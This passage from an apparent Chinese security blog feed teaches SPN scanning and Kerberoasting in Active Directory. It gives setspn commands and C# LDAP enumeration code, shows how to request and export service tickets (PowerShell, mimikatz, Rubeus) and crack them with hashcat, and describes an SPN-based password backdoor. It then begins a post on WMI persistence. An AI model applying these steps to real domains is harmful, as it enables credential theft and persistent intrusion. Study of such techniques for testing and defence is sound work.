    <content type="html"><![CDATA[<p><code>Kerberos</code> 与 <code>SPN</code>。<br><a id="more"></a><br>为什么代码不高亮了？？？ 目瞪口呆！！！</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。</p><p><code>Kerberoasting</code> 是域渗透中经常使用的一项技术，是通过爆破 <code>TGS-REP</code> 实现。</p><h2 id="0x01-关于-SPN"><a href="#0x01-关于-SPN" class="headerlink" title="0x01 关于 SPN"></a>0x01 关于 <code>SPN</code></h2><p>服务主体名称（<code>SPN: Service Principal Names</code>）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p><p>如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 <code>SPN</code>。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 <code>SPN</code>。<code>SPN</code> 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 <code>SPN</code>。</p><p>如果用一句话来说明的话就是如果想使用 <code>Kerberos</code> 协议来认证服务，那么必须正确配置 <code>SPN</code>。</p><p>SPN 可以分为两种：</p><ul><li>注册在域内机器账户（<code>Computers</code>）上</li><li>注册在域内用户账户（<code>Users</code>）下</li></ul><h2 id="0x02-SPN-标准格式"><a href="#0x02-SPN-标准格式" class="headerlink" title="0x02 SPN 标准格式"></a>0x02 <code>SPN</code> 标准格式</h2><p>在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 <code>&lt;service class&gt;</code> 和 <code>&lt;host&gt;</code> 为必需元素。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service <span class="class"><span class="keyword">class</span>&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;</span></span><br><span class="line">服务类型/对应机器名<span class="symbol">:</span>服务端口[默认端口可不写]</span><br><span class="line">MSSQLSvc/SQLServer.rcoil.<span class="symbol">me:</span><span class="number">1433</span></span><br></pre></td></tr></table></figure><h2 id="0x03-使用-SetSPN-为机器-域用户-创建-SPN"><a href="#0x03-使用-SetSPN-为机器-域用户-创建-SPN" class="headerlink" title="0x03 使用 SetSPN 为机器(域用户)创建 SPN"></a>0x03 使用 <code>SetSPN</code> 为机器(域用户)创建 <code>SPN</code></h2><p>命令语法类似如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn -S http/<span class="tag">&lt;<span class="name">computername</span>&gt;</span>.<span class="tag">&lt;<span class="name">domainname</span>&gt;</span> <span class="tag">&lt;<span class="name">domain-user-account</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>-S</code> 参数：验证不存在重复项后，添加随意 <code>SPN</code>。<strong>注意：</strong> <code>-S</code> 从 <code>Windows Server 2008</code> 开始系统默认提供。</p><p>此处以 Web 服务器为例。</p><ul><li>以 <code>web 用户</code> 运行 <code>Web 服务器</code></li><li>域管理员权限运行 <code>cmd</code></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Setspn -s http/WebDemo_PC<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> rcoil\web</span><br><span class="line">Setspn -s http/WebDemo_PC<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> WebDemo_PC$</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-06_15-41-04.png" alt="Snipaste_2019-06-06_15-41-04"></p><h2 id="0x04-借助-SetSPN-对域内相关服务进行查询"><a href="#0x04-借助-SetSPN-对域内相关服务进行查询" class="headerlink" title="0x04 借助 SetSPN 对域内相关服务进行查询"></a>0x04 借助 <code>SetSPN</code> 对域内相关服务进行查询</h2><h3 id="4-1、查询域内-MSSQL-数据库服务器"><a href="#4-1、查询域内-MSSQL-数据库服务器" class="headerlink" title="4.1、查询域内 MSSQL 数据库服务器"></a>4.1、查询域内 <code>MSSQL</code> 数据库服务器</h3><p><em>使用第 3 点中的对照表快速查询</em></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T rcoil.me -Q */* <span class="string">| findstr "</span>MSSQLSvc<span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="4-2、相关查询-C-源码"><a href="#4-2、相关查询-C-源码" class="headerlink" title="4.2、相关查询 C# 源码"></a>4.2、相关查询 <code>C# 源码</code></h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices.ActiveDirectory;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SPNSearcher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Domain CurrentDomain = Domain.GetCurrentDomain();</span><br><span class="line">            DirectoryEntry rootEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"LDAP://rootDSE"</span>);</span><br><span class="line">            <span class="keyword">string</span> RootDSE = (<span class="keyword">string</span>)rootEntry.Properties[<span class="string">"defaultNamingContext"</span>].Value;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domain: "</span>+ CurrentDomain);</span><br><span class="line">            GetSPNInfor(RootDSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> ADSearcherSPNTypes = "ADAM","AGPM","bo","CESREMOTE","Dfs","DNS","Exchange","FIMService","ftp","http","IMAP","ipp","iSCSITarget","kadmin","ldap","MS","sql","nfs","secshd","sip","SMTP","SoftGrid","TERMSRV","Virtual","vmrc","vnc","vpn","vssrvc","WSMAN","xmpp"</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="RootDSE"&gt;</span>Current forest.<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetSPNInfor</span>(<span class="params"><span class="keyword">string</span> RootDSE</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domian SPN Information:"</span>);</span><br><span class="line"></span><br><span class="line">            DirectoryEntry gcEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"GC://"</span> + RootDSE);</span><br><span class="line"></span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; Supersedence = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;();</span><br><span class="line">            Supersedence.AddRange(<span class="keyword">new</span> <span class="keyword">string</span>[]</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"SQL:*MSSQL*:SQL Server 数据库"</span>,</span><br><span class="line">                <span class="string">"Exchange:*exchange*:Exchange 相关服务"</span>,</span><br><span class="line">                <span class="string">"DNS:*DNS*:DNS 服务"</span>,</span><br><span class="line">                <span class="string">"SQL:*MySql*:MySql 数据库"</span>,</span><br><span class="line">                <span class="string">"Oracle:*Oracle*:Oracle 数据库"</span>,</span><br><span class="line">                <span class="string">"postgres:*postgres*:Postgres 数据库"</span>,</span><br><span class="line">                <span class="string">"HTTPS:*HTTPS*:HTTPS Web 服务"</span>,</span><br><span class="line">                <span class="string">"HTTP:*HTTP*:HTTP Web 服务"</span>,</span><br><span class="line">                <span class="string">"VPN:*VPN*:VPN 远程接入服务"</span>,</span><br><span class="line">                <span class="string">"VNC:*VNC*:VNC 服务"</span></span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> SPNServiceFilter <span class="keyword">in</span> Supersedence)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span>[] sArray = Regex.Split(SPNServiceFilter, <span class="string">":"</span>, RegexOptions.IgnoreCase);</span><br><span class="line">                <span class="keyword">string</span> ContainsInfo = sArray[<span class="number">0</span>].ToString();</span><br><span class="line">                <span class="keyword">string</span> ADSearcherSPNTypes = sArray[<span class="number">1</span>].ToString();</span><br><span class="line">                <span class="keyword">string</span> SPNService = sArray[<span class="number">2</span>].ToString();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (gcEntry)</span><br><span class="line">                &#123;</span><br><span class="line">                    DirectorySearcher spnSearch = <span class="keyword">new</span> DirectorySearcher(gcEntry, <span class="string">"(&amp;(objectClass=user)(servicePrincipalName="</span> + ADSearcherSPNTypes + <span class="string">"))"</span>);</span><br><span class="line"></span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                    Console.WriteLine(<span class="string">"  [+] SPN service: "</span> + SPNService);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span> (SearchResult sr <span class="keyword">in</span> spnSearch.FindAll())</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> SPNs = sr.Properties[<span class="string">"servicePrincipalName"</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (SPNs.Count &gt; <span class="number">1</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> (<span class="keyword">string</span> spn <span class="keyword">in</span> SPNs)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (spn.Contains(ContainsInfo))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    Console.WriteLine(<span class="string">"    [&gt;] SAM Account Name: &#123;0&#125;"</span>, sr.Properties[<span class="string">"sAMAccountName"</span>][<span class="number">0</span>]);</span><br><span class="line">                                    Console.WriteLine(<span class="string">"    [&gt;] "</span> + spn);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine(<span class="string">"    [&gt;] "</span> + SPNs[<span class="number">0</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自行添加需要的服务即可，更多的服务写在了备注中。</p><h3 id="4-3、相关原理说明"><a href="#4-3、相关原理说明" class="headerlink" title="4.3、相关原理说明"></a>4.3、相关原理说明</h3><p>在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容</p><p><code>LDAP 协议</code>全称是 <code>Lightweight Directory Access Protocol</code>，一般翻译都是翻译成 <strong>轻量目录访问协议</strong>。通俗点可以把 <code>LDAP 协议</code>理解为一个关系型数据库，其中存储了域内主机的各种配置信息。</p><p>在域控中默认安装有 <code>ADSI 编辑器</code>，它是 <code>LDAP</code> 的编辑器，可以通过在域控中运行 <code>adsiedit.msc</code> 来打开。</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_10-43-30.png" alt="Snipaste_2019-06-10_10-43-30"></p><p>我们的 <code>SPN 查询</code>，实际上就是就是查询 <code>LDAP</code> 中存储的内容。（以后会通过别的章节详细介绍 <code>LDAP 协议</code>）</p><p>下图是 <code>4.2</code> 中 <code>MSSQL 查询</code>的结果，协议为 <code>LDAP</code>。</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_10-19-38.png" alt="Snipaste_2019-06-10_10-19-38"></p><h3 id="4-4、更多扫描工具"><a href="#4-4、更多扫描工具" class="headerlink" title="4.4、更多扫描工具"></a>4.4、更多扫描工具</h3><p>扫描工具有很多，但是只要知道原理就不会觉得太难。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Discover-PAMSSQLServers</span><span class="params">(Powershell-AD-Recon)</span></span></span><br><span class="line"><span class="function"><span class="title">GetUserSPNs</span><span class="params">(Powershell、vbs、Python)</span></span></span><br><span class="line"><span class="function"><span class="title">PowerView</span><span class="params">(Powershell)</span></span></span><br><span class="line"><span class="function"><span class="title">SetSPN</span><span class="params">(exe)</span></span></span><br></pre></td></tr></table></figure><h2 id="0x05-获取当前目标域中所有以域用户身份起服务的-SPN"><a href="#0x05-获取当前目标域中所有以域用户身份起服务的-SPN" class="headerlink" title="0x05 获取当前目标域中所有以域用户身份起服务的 SPN"></a>0x05 获取当前目标域中所有以域用户身份起服务的 SPN</h2><p>查询以域用户身份起的服务，主要是为了后续 <code>Kerberoast</code>做准备。</p><ul><li>现成工具</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript<span class="selector-class">.exe</span> GetUserSPNs.vbs</span><br><span class="line">powerview --&gt; Get-NetUser -SPN</span><br></pre></td></tr></table></figure><ul><li><code>C# 代码</code>（其实就是查询LDAP）：</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetUserSPN</span>(<span class="params"><span class="keyword">string</span> RootDSE</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domian SPN Information:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            DirectoryEntry gcEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"GC://"</span> + RootDSE);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">string</span> querySPN = <span class="string">@"(&amp;(!objectClass=computer)(servicePrincipalName=*))"</span>;</span><br><span class="line">            <span class="keyword">using</span> (gcEntry)</span><br><span class="line">            &#123;</span><br><span class="line">                DirectorySearcher mssqlSearch = <span class="keyword">new</span> DirectorySearcher(gcEntry, querySPN);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (SearchResult sr <span class="keyword">in</span> mssqlSearch.FindAll())</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] SamAccountName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"sAMAccountName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] DistinguishedName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"distinguishedName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] ServicePrincipalName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"servicePrincipalName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li><p>结果如下：</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_11-22-02.png" alt="Snipaste_2019-06-10_11-22-02"></p></li></ul><h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><h3 id="6-1、申请-TGS"><a href="#6-1、申请-TGS" class="headerlink" title="6.1、申请 TGS"></a>6.1、申请 TGS</h3><ul><li><code>powershell</code></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;<span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</span><br><span class="line">PS&gt;<span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"HTTP/WebDemo_PC.rcoil.me"</span></span><br></pre></td></tr></table></figure><ul><li><code>C#</code></li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">KerberosRequestorSecurityToken</span> (<span class="params"><span class="keyword">string</span> servicePrincipalName</span>)</span>;</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">servicePrincipalName</span><br><span class="line">String</span><br><span class="line">KerberosRequestorSecurityToken 安全令牌的服务主体名称。 设置 ServicePrincipalName 属性。</span><br><span class="line">异常</span><br><span class="line">ArgumentNullException</span><br><span class="line">servicePrincipalName 为 <span class="literal">null</span>。</span><br><span class="line">SecurityTokenException</span><br><span class="line">无法为当前用户获取 Kerberos 票证。</span><br></pre></td></tr></table></figure><p>这一整个过程是通过 <code>AS-REQ、AS-REP、TGS-REQ、TGS-REP</code> 这四个认证流程，最终获取到 RC4方式的加密票据。</p><h3 id="6-2、获取-TGS-REP"><a href="#6-2、获取-TGS-REP" class="headerlink" title="6.2、获取 TGS-REP"></a>6.2、获取 TGS-REP</h3><p><code>Kerberos 协议</code>中请求的票据会保存在内存中，可以通过 <code>klist</code> 命令查看当前会话存储的 <code>kerberos</code> 票据。</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-17-14.png" alt="Snipaste_2019-06-10_15-17-14"></p><ul><li><p>使用 <code>mimikatz</code> 的 <code>kerberos::list /export</code> 导出。</p></li><li><p><code>SharpRost</code> （如今的Rubeus）</p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-53-24.png" alt="Snipaste_2019-06-10_15-53-24"></p></li><li><p><code>Invoke-kerberoast</code> 的 <code>-outputformat</code> ，选择 hashcat 格式。</p></li><li><p>综合以上代码，新建项目，项目地址: <a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SPNSearcher" target="_blank" rel="noopener">SPNSearcher</a></p></li></ul><h3 id="6-3、爆破-TGS-REP"><a href="#6-3、爆破-TGS-REP" class="headerlink" title="6.3、爆破 TGS-REP"></a>6.3、爆破 TGS-REP</h3><p>此处爆破的是<code>HTTP/WebDemo_PC.rcoil.me</code></p><p>可选择工具（工具始终是工具，看的是字典强不强）:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py(kerberoast套装)</span><br><span class="line"><span class="function"><span class="title">hashcat</span><span class="params">(密码破解全能工具，kali自带)</span></span></span><br></pre></td></tr></table></figure></p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-35-24.png" alt="Snipaste_2019-06-10_15-35-24"></p><p><img src="/image/【域渗透】 SPN 扫描利用/Snipaste_2019-06-10_15-46-01.png" alt="Snipaste_2019-06-10_15-46-01"></p><h2 id="0x07-Kerberoasting-的后门利用"><a href="#0x07-Kerberoasting-的后门利用" class="headerlink" title="0x07 Kerberoasting 的后门利用"></a>0x07 <code>Kerberoasting</code> 的后门利用</h2><p>在我们取得了 SPN 的修改权限后，可以为指定的域用户添加一个 SPN，这样可以随时获得该域用户的 TGS ，经过破解后获得明文口令。</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://docs.microsoft.com/zh-cn/sql/reporting-services/report-server/register-a-service-principal-name-spn-for-a-report-server?view=sql-server-2017" target="_blank" rel="noopener">为报表服务器注册服务主体名称 (SPN)</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken.-ctor?view=netframework-4.8" target="_blank" rel="noopener">KerberosRequestorSecurityToken(String)</a><br><a href="https://www.anquanke.com/post/id/161781#h3-8" target="_blank" rel="noopener">从 Kekeo 到 Rubeus</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/" target="_blank" rel="noopener">域渗透——Kerberoasting</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;Kerberos&lt;/code&gt; 与 &lt;code&gt;SPN&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>永久性 WMIC 事件订阅 - 权限维持（三）</title>
    <link href="https://rcoil.me/2019/05/%E6%B0%B8%E4%B9%85%E6%80%A7%20WMIC%20%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%20-%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://rcoil.me/2019/05/永久性 WMIC 事件订阅 - 权限维持（三）/</id>
    <published>2019-05-30T12:52:59.000Z</published>
    <updated>2019-05-31T08:16:16.781Z</updated>
    
    <content type="html"><![CDATA[<p>本文是针对<a href="https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png" target="_blank" rel="noopener">Windows常见持久控制</a>的第三次说明。</p><p>与之前的文章不同，这个操作需要管理员权限。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在日常中，使用 <code>WMI</code> 都是用于信息的收集，如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list <span class="comment">#获取补丁信息</span></span><br><span class="line">wmic startup list brief <span class="comment"># 启动的程序</span></span><br><span class="line">wmic startup list full <span class="comment"># 自启动的程序</span></span><br><span class="line">wmic process <span class="keyword">call</span> <span class="keyword">create</span> <span class="string">"calc.exe"</span> <span class="comment"># 在当前机器中执行指定程序</span></span><br><span class="line">wmic process <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'*.exe'</span> <span class="keyword">list</span> <span class="keyword">full</span>   <span class="comment">#查询某个进程所对应某个具体的可执行程序是什么</span></span><br><span class="line">wmic process <span class="keyword">where</span>(description=<span class="string">"rundll32.exe"</span>) <span class="comment"># 查看rundll32所加载的dll</span></span><br><span class="line">wmic cpu <span class="keyword">get</span> DataWidth /<span class="keyword">format</span>:<span class="keyword">list</span> <span class="comment"># 查询当前机器的操作系统位数</span></span><br><span class="line">wmic <span class="keyword">share</span>  <span class="keyword">get</span> <span class="keyword">name</span>,<span class="keyword">path</span>,<span class="keyword">status</span>  <span class="comment">#利用wmic查找共享</span></span><br><span class="line">wmic logicaldisk <span class="keyword">where</span> drivetype=<span class="number">3</span> <span class="keyword">get</span> <span class="keyword">name</span>,freespace,systemname,filesystem,volumeserialnumber,<span class="keyword">size</span> <span class="comment">#查看分区</span></span><br></pre></td></tr></table></figure><p>但其实它的功能还有很多，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">防病毒检测</span><br><span class="line">代码执行</span><br><span class="line">横向移动</span><br><span class="line">持久化</span><br><span class="line">盗取数据</span><br></pre></td></tr></table></figure><p>这里就针对持久化进行说明 。</p><h2 id="0x01-查询-WMI"><a href="#0x01-查询-WMI" class="headerlink" title="0x01 查询 WMI"></a>0x01 查询 WMI</h2><p><code>WMI</code> 提供了一种非常直观的语法用来查询WMI对象的实例，类和命名空间，即 <code>WQL</code> （类似 SQL的查询语言）。WQL查询通常可以分为以下几类：</p><ul><li>Instance Queries（实例查询）：查询WMI对象实例。</li><li>Event Queries（事件查询）：等同于在WMI对象创建/修改/删除的时候注册一个消息。</li><li>Meta Queries（元查询）：元查询用来获取WMI命名空间和类结构的元信息。</li></ul><h3 id="1-1-Instance-Queries"><a href="#1-1-Instance-Queries" class="headerlink" title="1.1 Instance Queries"></a>1.1 Instance Queries</h3><p>这是最常用的WQL查询。基本的格式如下：<br><code>SELECT [Class property name | *] FROM [CLASS NAME] &lt;WHERE [CONSTRAINT]&gt;</code></p><ul><li>下面的查询语句将返回所有可执行文件名中带有 <code>chrome</code> 的正在运行的进程：<br><code>SELECT * FROM Win32_Process WHERE Name LIKE &quot;%chrome%&quot;</code></li></ul><h3 id="1-2-Event-Queries"><a href="#1-2-Event-Queries" class="headerlink" title="1.2 Event Queries"></a>1.2 Event Queries</h3><p>事件查询被用作一种消息机制来监听事件类的触发。通常用来在一个WMI对象实例创建/修改/删除的时候给用户发送一个消息。根据消息类型是 <code>intrinsic</code>（系统自带的）还是 <code>extrinsic</code>（第三方的），查询语句格式不同：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [INTRINSIC <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] <span class="keyword">WITHIN</span> [POLLING <span class="built_in">INTERVAL</span>] &lt;<span class="keyword">WHERE</span> [<span class="keyword">CONSTRAINT</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">Class</span> property <span class="keyword">name</span> | *] <span class="keyword">FROM</span> [EXTRINSIC <span class="keyword">CLASS</span> <span class="keyword">NAME</span>] &lt;<span class="keyword">WHERE</span> [<span 